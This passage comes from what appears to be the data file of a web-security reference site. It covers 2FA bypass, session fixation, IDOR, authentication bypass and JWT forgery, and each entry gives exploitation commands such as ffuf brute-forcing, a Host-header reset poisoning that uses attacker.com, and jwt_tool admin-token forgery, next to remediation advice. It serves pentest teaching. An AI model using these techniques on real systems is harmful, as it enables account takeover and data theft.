            ["No audience / recipient / timestamp checks", "Replay assertions across apps or after expiry"],
            ["XML comment in NameID (e.g. admin<!---->@x)", "Parser truncation changes the effective identity"],
            ["Trusting IdP-supplied Issuer/URLs blindly", "SSRF and open-redirect style abuse"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "PortSwigger — SAML security", "url": "https://portswigger.net/web-security/saml" },
            { "label": "SAML Raider (Burp extension)", "url": "https://github.com/CompassSecurity/SAMLRaider" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Require a valid signature and reject any assertion that is unsigned or whose signature does not cover the exact element being read.",
            "Use a hardened, well-maintained SAML library rather than hand-rolled XML parsing, and keep it patched.",
            "Validate Audience, Recipient, NotBefore/NotOnOrAfter, and InResponseTo on every assertion.",
            "Canonicalise safely and reject documents with unexpected extra assertions or XML comments in identity fields.",
            "Pin the IdP's signing certificate and rotate it through a controlled process."
          ]}
        ]
      },
      {
        "id": "otp-2fa-bypass",
        "name": "OTP / 2FA Bypass",
        "severity": "High",
        "ref": "https://portswigger.net/web-security/authentication/multi-factor",
        "description": "The one-time-code or second-factor step can be brute-forced, skipped, or bypassed, defeating multi-factor authentication.",
        "brief": "One-time passwords and second factors are only as strong as the checks around them. Common failures include short numeric codes with no attempt limit (brute-forceable), the ability to reach the post-2FA state without completing the step (flow skipping), trusting a client-controlled response, and race conditions that accept a code more than once. Any of these reduces 'two-factor' back to just the password.\n\nImpact: complete bypass of MFA, leading to account takeover even when the password is known to be protected by a second factor.",
        "quickReference": [
          { "label": "Brute force a short code", "cmd": "# 4-6 digit code, no attempt limit -> Burp Intruder over 000000-999999 in the OTP window" },
          { "label": "Skip the step", "cmd": "# after password, browse directly to the authenticated page / call the post-2FA endpoint" },
          { "label": "Response manipulation", "cmd": "# submit a wrong code, change  {\"verified\":false}  ->  true  in the response" },
          { "label": "Reuse / race the code", "cmd": "# send many verify requests in parallel; is one code accepted twice, or the limit skipped?" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Brute force with no rate limit", "cmd": "# capture the verify request, then Intruder / ffuf across all codes:\nffuf -w codes.txt -X POST -d 'otp=FUZZ' -u https://target/2fa/verify -H 'Cookie: <pre-2fa session>'\n# a valid session that outlives many attempts = brute-forceable" },
            { "label": "2. Flow skipping (broken state)", "cmd": "# 1) submit username+password -> receive a 'needs 2FA' session\n# 2) instead of verifying, request an authenticated page or the final /login/complete\n# if it succeeds, the 2FA gate is not enforced server-side" },
            { "label": "3. Response / status manipulation", "cmd": "# submit an invalid code, then edit the response in Burp:\n#   HTTP/1.1 401  ->  200\n#   {\"success\":false} -> {\"success\":true}\n# a client that trusts the response lets you in" },
            { "label": "4. Reuse, race, and backup-code abuse", "cmd": "# fire N parallel verify requests (race) to accept one code multiple times;\n# also test whether old codes stay valid and whether backup codes are rate-limited" }
          ]},
          { "title": "Bypass Classes", "type": "table", "columns": ["Class", "Root cause"], "rows": [
            ["Brute force", "Short code + no attempt limit + long validity window"],
            ["Flow skipping", "Post-2FA state reachable without completing 2FA"],
            ["Response manipulation", "Client trusts a server response the attacker can edit"],
            ["Race condition", "Non-atomic verification accepts a code more than once"],
            ["Weak reset/backup path", "Disable 2FA or recover via an unprotected channel"],
            ["Code leakage", "OTP returned in a response, log, or predictable from a seed"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "PortSwigger — Multi-factor authentication bypass", "url": "https://portswigger.net/web-security/authentication/multi-factor" },
            { "label": "OWASP — Testing for Weaker Authentication in Alternative Channel", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Strictly rate-limit and lock the OTP step, invalidate the code after a few failures, and keep the validity window short (30-60s for TOTP).",
            "Enforce the 2FA requirement server-side on the session; never allow the authenticated state to be reached without it.",
            "Make verification atomic and single-use to remove races and code reuse.",
            "Never return the code or a trustable success flag to the client; decide server-side.",
            "Protect the reset/backup and 'disable 2FA' paths with the same rigour as the primary factor."
          ]}
        ]
      },
      {
        "id": "session-fixation",
        "name": "Session Fixation",
        "severity": "Medium",
        "ref": "https://owasp.org/www-community/attacks/Session_fixation",
        "description": "The session identifier is not regenerated at login, so an attacker who plants a known session id can ride the victim's authenticated session.",
        "brief": "In a session-fixation attack the attacker first obtains or sets a valid session identifier, then tricks the victim into authenticating with that same identifier. Because the application keeps the pre-login session id after authentication instead of issuing a fresh one, the attacker's known id is now bound to the victim's logged-in session.\n\nImpact: full session hijacking and account takeover. The tell is simple — the session cookie value is identical before and after login.",
        "quickReference": [
          { "label": "The core test", "cmd": "# note the session cookie BEFORE login, authenticate, compare AFTER — same value = vulnerable" },
          { "label": "Attacker sets the id", "cmd": "# can you set the session via a URL param or a settable cookie? ?sessionid=ATTACKER" },
          { "label": "Fixate then hijack", "cmd": "# plant a known id in the victim's browser, wait for them to log in, reuse the id" }
        ],
        "sections": [
          { "title": "How It's Exploited", "type": "commands", "commands": [
            { "label": "1. Confirm the id survives login", "cmd": "# grab the pre-auth cookie:\ncurl -s -i https://target/login | grep -i set-cookie\n# log in reusing that exact cookie, then check the post-auth cookie is UNCHANGED" },
            { "label": "2. Plant a known session id in the victim", "cmd": "# if the app accepts an attacker-supplied id (URL param, subdomain cookie, XSS):\nhttps://target/?sessionid=KNOWN123\n# or set a cookie for the parent domain from a sibling subdomain" },
            { "label": "3. Hijack after the victim authenticates", "cmd": "# the victim logs in on KNOWN123; the attacker now uses KNOWN123 and is inside\ncurl -s https://target/account -b 'sessionid=KNOWN123'" }
          ]},
          { "title": "Enablers", "type": "table", "columns": ["Condition", "Why it matters"], "rows": [
            ["No session regeneration on login", "The pre-login id becomes the authenticated id"],
            ["Session id accepted from URL/param", "Attacker can set the id without any cookie access"],
            ["Cookies scoped to the parent domain", "A sibling subdomain can fixate the cookie"],
            ["Long session lifetime / no re-auth", "The fixated session stays useful for longer"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP — Session fixation", "url": "https://owasp.org/www-community/attacks/Session_fixation" },
            { "label": "OWASP — Session Management Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Regenerate the session identifier on every privilege change, especially at login (and invalidate the old one).",
            "Only accept session ids from a Secure, HttpOnly cookie — never from URL parameters or request bodies.",
            "Scope cookies tightly (host-only where possible) so sibling subdomains cannot set them.",
            "Set sensible idle and absolute session timeouts and require re-authentication for sensitive actions.",
            "Bind sessions to reasonable attributes and invalidate them fully on logout."
          ]}
        ]
      },
      {
        id: "idor",
        name: "IDOR / Broken Access Control",
        severity: "High",
        ref: "https://portswigger.net/web-security/access-control",
        description: "The app trusts a client-supplied identifier without checking ownership, exposing other users' data or actions.",
        brief: "Broken access control is consistently the most prevalent serious web weakness (OWASP Top 10 #1), and IDOR — Insecure Direct Object Reference — is its signature form. An IDOR exists when an endpoint takes a reference to an object (a user id, order number, document GUID, filename) directly from the client and then reads or modifies that object without checking that the authenticated user is actually authorised for it. The classic proof is trivial: change the id in the request from yours to someone else's and receive their data.\n\nIt helps to name the two axes. Object-level (horizontal) access control decides whether you may touch THIS specific record; its failure is the textbook IDOR — /account/1001 returning 1002's data. Function-level (vertical) access control decides whether your role may perform THIS action at all; its failure is a normal user reaching an admin-only endpoint the UI merely hid. Related failures include mass-assignment-style parameter trust (the server believing a client-sent role=admin or userId), and multi-step flows where the authorisation check lives on a step you can skip.\n\nThe common root cause is authorising on what the client sends (an id, a role flag, a hidden field) instead of on the server-side authenticated identity. Because it is pure application logic, automated scanners miss most of it — it is found by testing with real accounts and swapping references. Impact is severe and immediate: bulk exfiltration of other users' records by enumerating ids, cross-account takeover (change someone else's email/password), reading or altering financial and PII data, and escalation into administrative functionality.",
        quickReference: [
          { label: "Horizontal IDOR", cmd: "GET /api/account/1001  ->  change to 1002" },
          { label: "Function-level abuse", cmd: "PUT /api/user/1002/role {\"role\":\"admin\"}  as a normal user" },
          { label: "Guess/enumerate identifiers", cmd: "Sequential ids, predictable GUIDs, base64/hashids in params & cookies" },
          { label: "Force-browse hidden paths", cmd: "/admin, /api/internal, endpoints harvested from JS & wayback" }
        ],
        sections: [
          {
            title: "Root Cause & Concepts",
            type: "notes",
            items: [
              "The app authorises on client-supplied data (an id, a role parameter, a hidden field, a cookie value) rather than on the server-side session identity — so the client can simply change it.",
              "Object-level (horizontal): 'can this user access THIS object?' — failure = classic IDOR, reading/editing another user's record at the same privilege.",
              "Function-level (vertical): 'may this user's role perform THIS action?' — failure = a low-priv user reaching admin functions the UI only hid client-side.",
              "'Direct object reference' just means the identifier maps straight to a back-end object; the bug is the missing ownership check, not the id being visible.",
              "Unpredictable ids (GUIDs) are NOT access control — they slow enumeration but the object is still served to anyone who presents the reference (which often leaks in other responses, emails, or logs)."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Any request carrying an identifier: /account/{id}, ?order=, ?doc=, ?userId=, filename params, and GUIDs in the path, query, body, or cookies.",
              "State-changing actions on objects: change email/password, update profile, delete item, download invoice/report, view message — test these, not just reads.",
              "APIs and mobile back-ends, where per-object checks are frequently weaker than the web UI and ids are exposed plainly.",
              "PDF/print/export endpoints (often take a raw id and skip the check the main view does), and file download handlers.",
              "Function-level: admin/internal endpoints discoverable from JS bundles, source maps, sitemaps, and wayback — the UI hiding a button never means the endpoint is protected."
            ]
          },
          {
            title: "Step 1 — Find & Confirm an IDOR",
            type: "commands",
            commands: [
              { label: "Capture your own object requests", cmd: "# log in as user A and note every request carrying a reference\nGET /api/account/1001            # your account id\nGET /api/orders/50231/invoice    # order/document ref\nGET /files/download?id=8842      # file handler" },
              { label: "Swap in another user's reference", cmd: "GET /api/account/1002            # neighbouring id -> someone else's data?\n# harvest real ids from other responses, emails, or shared links\n# 200 + another user's data (verify with a second account) = confirmed IDOR" },
              { label: "Decode & tamper indirect refs", cmd: "# ids are often lightly obscured, not protected:\nbase64:  MTAwMg== -> 1002    hashids/short codes -> increment\n# predictable GUIDs, or a GUID leaked elsewhere, are still IDOR" },
              { label: "Two-account differential (the gold standard)", cmd: "# create user A (victim) and user B (attacker)\n# take A's request, replay it authenticated as B\n# if B gets A's resource, it is a real IDOR (not just a guessable id)" }
            ]
          },
          {
            title: "Step 2 — Function-Level & Parameter Bypass",
            type: "commands",
            commands: [
              { label: "Reach admin-only functions as a normal user", cmd: "# the UI hides it; the endpoint may not enforce the role:\nPUT  /api/user/1002/role   {\"role\":\"admin\"}\nDELETE /api/orders/50231\nGET  /admin/users          # force-browse admin routes" },
              { label: "Trust-the-client parameters", cmd: "# the server may honour a role/id you supply:\nPOST /api/action  {\"userId\":1002,\"role\":\"admin\"}\n# hidden fields, ?admin=true, ?debug=1 — see Mass Assignment" },
              { label: "HTTP method & verb tricks", cmd: "# if GET is checked but not others (or vice versa):\nchange GET->POST/PUT/PATCH, add X-HTTP-Method-Override: PUT\n# some frameworks route differently and skip the guard" },
              { label: "Path & wrapper tricks", cmd: "# access-control sometimes keys on the exact path string:\n/admin/./users   /ADMIN/users   /admin/users/..;/\n/api/v1/../v2/admin   # canonicalisation gaps" }
            ]
          },
          {
            title: "Step 3 — Automate & Enumerate",
            type: "commands",
            commands: [
              { label: "Burp Autorize (two-session testing)", cmd: "# configure Autorize with the low-priv (attacker) session cookie,\n# then browse the app as the high-priv (victim/admin) user.\n# Autorize replays each request with the low-priv session and flags\n# every one that still succeeds -> missing per-object/per-function checks at scale" },
              { label: "Enumerate sequential ids", cmd: "ffuf -w ids.txt -u 'https://target/api/account/FUZZ' \\\n  -H 'Cookie: session=<yours>' -mc 200 -mr 'email'\n# or Burp Intruder over the numeric range; harvest every record returned" },
              { label: "Discover hidden endpoints to test", cmd: "gau target.com | grep -Ei 'admin|internal|user|order|id='\nwaybackurls target.com\n# extract routes from JS bundles/source maps, then force-browse them" }
            ]
          },
          {
            title: "Forms of Broken Access Control",
            type: "table",
            columns: ["Form", "Description"],
            rows: [
              ["Horizontal IDOR", "Access another user's resource at the same privilege level"],
              ["Vertical escalation", "A low-priv user reaches admin/privileged functionality"],
              ["Missing function-level check", "The UI hides an action but the endpoint does not enforce the role"],
              ["Parameter trust / mass assignment", "Server honours a client-sent role=admin, userId, or hidden field"],
              ["Multi-step bypass", "Skipping the step that actually carries the authorization check"],
              ["Method/path canonicalisation", "Changing verb or path form slips past a string-matched guard"]
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find an endpoint taking a client reference", "Candidate IDOR"],
              ["2", "Swap in another user's reference (2-account proof)", "Access to their resource"],
              ["3", "Automate enumeration over the id space", "Mass data exposure (PII, financial)"],
              ["4", "Alter another user's object (email/password)", "Cross-account takeover"],
              ["5", "Reach function-level admin gaps", "Privilege escalation, site-wide control"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite + Autorize", "Automatic per-request access-control testing with two sessions"],
              ["Burp Suite + AuthMatrix", "Matrix-style role vs endpoint authorization testing"],
              ["ffuf / Burp Intruder", "Enumerate sequential or fuzzable identifiers at scale"],
              ["gau / waybackurls / JS parsers", "Discover hidden endpoints to force-browse"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Access control vulnerabilities (with labs)", url: "https://portswigger.net/web-security/access-control" },
              { label: "OWASP — Broken Access Control (Top 10 A01)", url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" },
              { label: "OWASP — IDOR Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" },
              { label: "OWASP — Authorization Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce authorization on the server for every request, keyed to the authenticated session — never trust an id, role, or flag sent by the client.",
              "Perform an explicit ownership/permission check at the data layer for the specific object: does this user own or have rights to THIS record? Centralise it so no endpoint can forget it.",
              "Deny by default: every function and object requires an explicit grant; new endpoints are inaccessible until access is defined.",
              "Prefer indirect references scoped to the session (a per-user mapping, or 'me' endpoints like /account instead of /account/{id}) so the client cannot name another user's object at all.",
              "Do not treat unguessable ids (GUIDs) as protection — always check ownership regardless of how the reference is generated.",
              "Bake access-control testing with least-privilege accounts into every release and CI, since scanners miss logic flaws; log and alert on authorization failures and enumeration patterns."
            ]
          }
        ]
      },
      {
        id: "auth-bypass",
        name: "Authentication Bypass",
        severity: "Critical",
        ref: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
        description: "Flaws in login, session, or recovery logic that let an attacker authenticate without valid credentials.",
        brief: "Authentication exists to prove a user is who they claim to be; an authentication bypass defeats that proof and grants access without a valid credential. Unlike a single technical bug, this is a family of flaws spread across the whole identity lifecycle — the login flow, multi-factor steps, 'remember me' and SSO paths, session handling, and account recovery — that share one outcome: getting into an account (often a privileged one) you should not.\n\nThe failures cluster into recognisable classes. Broken MFA (the second factor is enforced only in the UI, its verified state is client-controlled, or the post-MFA endpoint is reachable directly). Login logic flaws (username enumeration that narrows the attack, no rate-limiting so credential stuffing and brute force succeed, response manipulation where the client is trusted to report success). Broken session management (the session id is not regenerated on login, is predictable, or is never invalidated on logout). Password-reset weaknesses (guessable or non-expiring tokens, tokens not bound to the requesting user, and reset links whose host comes from the attacker-controlled Host header). And leftover default or test accounts.\n\nImpact ranges from single-account takeover to mass compromise when the flaw is systemic (a predictable reset-token scheme, a session id that can be fixed for any victim). This entry covers the flow- and logic-level failures; injection-based login bypasses (SQL/NoSQL/LDAP) and cryptographic token forgery (JWT) are documented in their own entries and frequently chain with these.",
        quickReference: [
          { label: "MFA step skippable", cmd: "Finish step 1, then request the post-MFA endpoint directly (forced browsing)" },
          { label: "Response tampering", cmd: "Flip {\"success\":false}/{\"mfa\":\"fail\"} in the response where the client is trusted" },
          { label: "Reset-link poisoning", cmd: "POST /reset  Host: attacker.com  -> victim's link points to you" },
          { label: "Session fixation", cmd: "Plant a known session id pre-login; if it survives auth, ride it" }
        ],
        sections: [
          {
            title: "Root Cause & Where It Lives",
            type: "notes",
            items: [
              "The recurring root cause is trusting the client to enforce or report an authentication decision that only the server should make and check.",
              "Login: is every attempt rate-limited and account-lockout aware? Do error messages, timing, or status codes differ for valid vs invalid usernames (enumeration)?",
              "MFA / step-up: is the second factor verified server-side on every protected request, or can the authenticated-but-not-MFA'd session reach protected endpoints?",
              "Session: is a fresh session id issued at login and at privilege change, is the old one killed, and is logout a true server-side invalidation (not just a cookie delete)?",
              "Recovery: are reset/verification tokens high-entropy, single-use, short-lived, and bound to the exact user — and are reset links built from a fixed base URL rather than request-controlled headers?",
              "Leftovers: default vendor credentials, seeded test/admin accounts, and 'backdoor' debug logins that were never removed."
            ]
          },
          {
            title: "Step 1 — Test the Login Flow",
            type: "commands",
            commands: [
              { label: "Username enumeration", cmd: "# compare responses for a known-good vs random username\n# look for: different error text, different HTTP status, response-time delta\nvalid@corp   -> 'Incorrect password'\nrandom@corp  -> 'No such user'      # <- enumeration oracle\n# also check registration and reset for the same tell" },
              { label: "Rate-limiting / lockout", cmd: "# fire N wrong passwords and see if you are throttled or locked\nffuf -w passwords.txt -u https://t/login -X POST -d 'user=admin&pass=FUZZ' -mc all\n# no lockout / no captcha after many tries = brute force & stuffing viable\n# check whether lockout is per-account (bypass by rotating usernames)" },
              { label: "Response manipulation", cmd: "# intercept the login/2fa RESPONSE and flip the verdict the client trusts:\n{\"authenticated\":false} -> true\nHTTP/1.1 401 -> 200 with a crafted body\n# works when the front-end, not the server, decides what happens next" },
              { label: "Forced browsing past a factor", cmd: "# authenticate step 1 only, then hit the post-MFA page directly:\nGET /account   Cookie: <half-authenticated session>\n# loads = the MFA gate is client-side / not enforced on the resource" }
            ]
          },
          {
            title: "Step 2 — Session & MFA Weaknesses",
            type: "commands",
            commands: [
              { label: "Session not regenerated on login", cmd: "# note the session id BEFORE login, log in, compare AFTER\n# same id = session fixation risk: an attacker who plants that id\n# (via a link, an XSS, or a shared value) rides the victim's session" },
              { label: "Logout / invalidation", cmd: "# capture an authenticated request, log out, then REPLAY the old cookie/token\n# still works = session not invalidated server-side (only cookie cleared)" },
              { label: "Token predictability", cmd: "# collect many session ids / reset tokens and inspect for structure:\n# sequential, timestamp-based, short, or low-entropy = guessable\n# quantify with Burp Sequencer" },
              { label: "MFA-specific bypasses", cmd: "# skip the MFA request entirely and proceed; reuse a prior 'mfa_passed' flag;\n# brute force a short OTP without rate limit; replay a used OTP;\n# see the OTP / 2FA Bypass entry for the full matrix" }
            ]
          },
          {
            title: "Step 3 — Attack Password Reset",
            type: "commands",
            commands: [
              { label: "Token analysis", cmd: "# request several reset tokens for accounts you control and inspect:\n# - entropy (is it guessable / sequential / a hashed timestamp?)\n# - is it bound to the user, or can token(A) reset account(B)?\n# - does it expire, and can it be used more than once?" },
              { label: "Host-header poisoning of the reset link", cmd: "POST /forgot-password\nHost: attacker.com\nX-Forwarded-Host: attacker.com\n\nemail=victim@corp\n# if the emailed link is https://attacker.com/reset?token=... you capture\n# the victim's token when they click (see Host Header Injection)" },
              { label: "Parameter / flow tampering", cmd: "# reset for your account, then swap the user id/email in the confirm step:\nPOST /reset/confirm  token=<yours>&user=victim   # IDOR in recovery\n# or add a second email param (parameter pollution) to redirect the mail" },
              { label: "Account takeover via linking", cmd: "# pre-register with a victim's email before they sign up via SSO,\n# or abuse unverified-email acceptance so your account binds to theirs" }
            ]
          },
          {
            title: "Common Bypass Classes",
            type: "table",
            columns: ["Class", "Example"],
            rows: [
              ["Broken MFA", "Second factor enforced only in the UI; verified state forgeable; post-MFA endpoint reachable directly"],
              ["Login logic", "Username enumeration, no rate-limit/lockout, response manipulation, timing side-channels"],
              ["Session management", "No regeneration on login/priv-change, predictable ids, no server-side invalidation on logout"],
              ["Password reset", "Guessable/non-expiring/reusable tokens, token not user-bound, reset host from Host header"],
              ["Recovery logic", "IDOR in the confirm step, parameter pollution of the target email, pre-account-takeover"],
              ["Default/weak accounts", "Vendor defaults, seeded test/admin accounts, debug backdoors"]
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Map the full auth / MFA / reset flow", "Every enforced (and unenforced) step is known"],
              ["2", "Skip a step, tamper a signal, or replay", "Server accepts an unproven authenticated state"],
              ["3", "Or capture/forge a reset or session token", "Control of the account's credential path"],
              ["4", "Authenticate as the victim", "Account takeover / MFA defeat"],
              ["5", "If the flaw is systemic", "Mass compromise across the user base"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (Repeater/Intruder)", "Flow mapping, response tampering, reset-token capture, forced browsing"],
              ["Burp Sequencer", "Measure entropy/predictability of session and reset tokens"],
              ["hydra / ffuf / medusa", "Credential stuffing, default-credential and rate-limit testing"],
              ["custom scripts", "Bulk-collect and statistically analyse tokens; automate reset abuse"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Authentication vulnerabilities (with labs)", url: "https://portswigger.net/web-security/authentication" },
              { label: "OWASP — Identification and Authentication Failures", url: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" },
              { label: "OWASP — Authentication Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" },
              { label: "OWASP — Forgot Password Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce every authentication and MFA step server-side on the protected resource itself; never trust a client-supplied flag that a factor was satisfied or a step completed.",
              "Regenerate the session identifier on login and on any privilege change, invalidate it fully server-side on logout and password reset, and set a sensible idle/absolute expiry.",
              "Issue reset and verification tokens with high entropy from a CSPRNG, bind them to the exact user, make them single-use, and expire them within minutes.",
              "Build reset and confirmation links from a fixed, configured base URL — never from the Host / X-Forwarded-Host header.",
              "Return identical, generic responses (and comparable timing) for valid and invalid usernames on login, registration, and reset to prevent enumeration.",
              "Apply rate-limiting, progressive delays, and account lockout/CAPTCHA to all authentication and recovery endpoints; alert on anomalies.",
              "Remove default and test accounts, require MFA on sensitive/admin accounts, and enforce a strong password policy with breached-password checks."
            ]
          }
        ]
      },
      {
        id: "jwt-vulns",
        name: "JWT Vulnerabilities",
        severity: "High",
        ref: "https://portswigger.net/web-security/jwt",
        description: "Implementation flaws in JSON Web Tokens — alg confusion, none, weak secrets — enabling token forgery.",
        brief: "A JSON Web Token is a compact, self-contained credential of three base64url parts — header.payload.signature — that carries identity and claims (sub, role, exp) and is verified by the server without server-side session state. That statelessness is the appeal and the risk: all trust rests on the signature, so any flaw in how the signature is produced or checked lets an attacker forge a token with whatever identity and privileges they want.\n\nThe well-known flaw classes are: accepting the 'none' algorithm (an unsigned token treated as valid); algorithm confusion, where an endpoint that should verify an RS256 token is tricked into an HS256 code path so the (public) RSA key becomes the HMAC secret the attacker also holds; weak HMAC secrets that crack offline; and header-driven key resolution (kid, jku, x5u) where the attacker points key lookup at their own key, a traversable path, or an injectable store. On top of these are claim-validation failures: not checking exp (replay of expired tokens), aud/iss (using a token minted for another service), or the signature at all.\n\nBecause the token is presented on every request (cookie, Authorization: Bearer, or body), a working forgery is immediate and repeatable privilege escalation or full account takeover — often to admin. JWTs also frequently leak (logs, referers, local storage exposed via XSS), so token theft and forgery are complementary risks.",
        quickReference: [
          { label: "alg: none", cmd: "Set header alg to none/None/NONE, strip the signature — some libs accept it" },
          { label: "Key confusion RS256->HS256", cmd: "HMAC-sign with the server's RSA public key as the secret" },
          { label: "Crack the HMAC secret", cmd: "hashcat -m 16500 token.jwt wordlist.txt   then re-sign any claims" },
          { label: "kid / jku abuse", cmd: "Point kid at a file you control, or jku at your JWKS" }
        ],
        sections: [
          {
            title: "Structure & Root Cause",
            type: "notes",
            items: [
              "A JWT is header.payload.signature, each base64url-encoded. The header names the algorithm (alg) and key (kid/jku); the payload holds claims; the signature covers header+payload. Decoding is not decryption — anyone can read the claims.",
              "The root cause of most attacks is letting the TOKEN dictate how it is verified: honouring alg:none, or picking the verification algorithm/key from attacker-controlled header fields.",
              "Algorithm confusion works because HMAC (HS256) and RSA (RS256) share one verify() API in many libraries: if the code passes the RSA public key to a routine that treats it as an HMAC secret, and the public key is known (JWKS/cert), the attacker can mint valid HS256 tokens.",
              "HMAC security depends entirely on secret entropy — a dictionary-word or short secret is recovered offline, after which the attacker signs anything.",
              "Even with a sound signature, missing claim checks (exp, nbf, aud, iss) allow replay, cross-service reuse, and use of stale tokens."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Anywhere a three-part base64 string riding a dot appears: session cookies, Authorization: Bearer headers, request bodies, and OAuth/OIDC id_tokens.",
              "The header's alg and kid/jku/x5u fields — these decide which attacks are even possible.",
              "Public key exposure: /.well-known/jwks.json, OIDC discovery, TLS certs, or a JWKS URL referenced by jku — needed for the RS256->HS256 attack.",
              "Claims worth forging: sub/user, role/scope/groups, admin flags, tenant ids, and any authorisation-relevant field.",
              "Endpoints that mix token sources (accept the JWT from both cookie and header) or multiple services sharing tokens (aud confusion)."
            ]
          },
          {
            title: "Step 1 — Decode & Triage",
            type: "commands",
            commands: [
              { label: "Decode header + claims", cmd: "jwt_tool <token>\n# or manually: echo <part> | base64 -d\n# note: alg (HS256/RS256/none), kid/jku/x5u, and the claims you'd forge (role, sub)" },
              { label: "Run the automated playbook", cmd: "jwt_tool <token> -M at -t https://target/api/me -rc 'session=<jwt>'\n# -M at exercises alg:none, RS256->HS256, blank/known keys, and claim tampering,\n# replaying against the endpoint; any still-authorised response is a working forgery" },
              { label: "Check claim validation", cmd: "# replay an EXPIRED token -> still accepted? exp not checked\n# use a token from service A on service B -> accepted? aud/iss not checked\n# strip the signature but keep alg=HS256 -> accepted? signature not verified" }
            ]
          },
          {
            title: "Step 2 — Signature-Bypass Attacks",
            type: "commands",
            commands: [
              { label: "alg: none", cmd: "# set the header alg to none and remove the signature (keep the trailing dot):\njwt_tool <token> -X a -pc role -pv admin\n# try variants none / None / NONE / nOnE to dodge case-sensitive blocklists" },
              { label: "RS256 -> HS256 key confusion", cmd: "# 1) obtain the server's RSA public key (jwks.json / TLS cert / derive from 2 tokens)\n# 2) HMAC-sign a token using that public key as the secret:\njwt_tool <token> -X k -pk public.pem -pc role -pv admin\n# the RS256 verifier, routed through HS256, validates it with the public key" },
              { label: "Crack a weak HMAC secret", cmd: "hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt\njohn token.jwt --wordlist=secrets.txt\n# then re-sign arbitrary claims:\njwt_tool <token> -S hs256 -p '<cracked-secret>' -pc role -pv admin" },
              { label: "kid / jku / x5u abuse", cmd: "# kid path traversal to a known-content file used as the key:\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"} -> sign with empty key\n# kid SQLi to control the returned key; jku/x5u pointing at YOUR JWKS:\n{\"alg\":\"RS256\",\"jku\":\"https://attacker/jwks.json\"} -> sign with your private key" }
            ]
          },
          {
            title: "Attack Classes",
            type: "table",
            columns: ["Attack", "Condition"],
            rows: [
              ["alg: none", "Library honours an unsigned token when alg is none/None/NONE"],
              ["Algorithm confusion", "RS256 tokens verified through an HS256 path using the public key as secret"],
              ["Weak HMAC secret", "Short/guessable secret cracks offline, then forge anything"],
              ["kid injection", "kid used in a file path (traversal) or query (SQLi) to control the key"],
              ["jku / x5u abuse", "Key fetched from an attacker-controlled URL not allow-listed"],
              ["Missing claim checks", "exp/nbf/aud/iss unvalidated -> replay or cross-service use"],
              ["No signature check", "Server decodes but never verifies -> tamper any claim"]
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Decode the token, read alg + claims", "Applicable attack surface identified"],
              ["2", "Break verification (none / confusion / weak secret / kid-jku)", "Ability to sign arbitrary tokens"],
              ["3", "Forge claims (sub, role, tenant)", "Any identity or admin role"],
              ["4", "Replay to the API on every request", "Privilege escalation / full account takeover"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["jwt_tool", "Automated JWT attack playbook, forgery, and endpoint replay"],
              ["hashcat (-m 16500) / John", "Crack weak HMAC signing secrets offline"],
              ["Burp JWT Editor extension", "Manual header/claim tampering, key-confusion and none signing"],
              ["jwt.io", "Quick decode and inspection (paste tokens you own, not secrets)"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — JWT attacks (with labs)", url: "https://portswigger.net/web-security/jwt" },
              { label: "OWASP — JSON Web Token Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" },
              { label: "RFC 8725 — JWT Best Current Practices", url: "https://datatracker.ietf.org/doc/html/rfc8725" },
              { label: "PayloadsAllTheThings — JWT", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Pin the expected algorithm server-side and reject any token whose alg does not match; explicitly reject 'none' in every case.",
              "Never let the verification routine choose the algorithm/key from the token header — use an API that takes the algorithm and key as fixed parameters (this is the fix for algorithm confusion).",
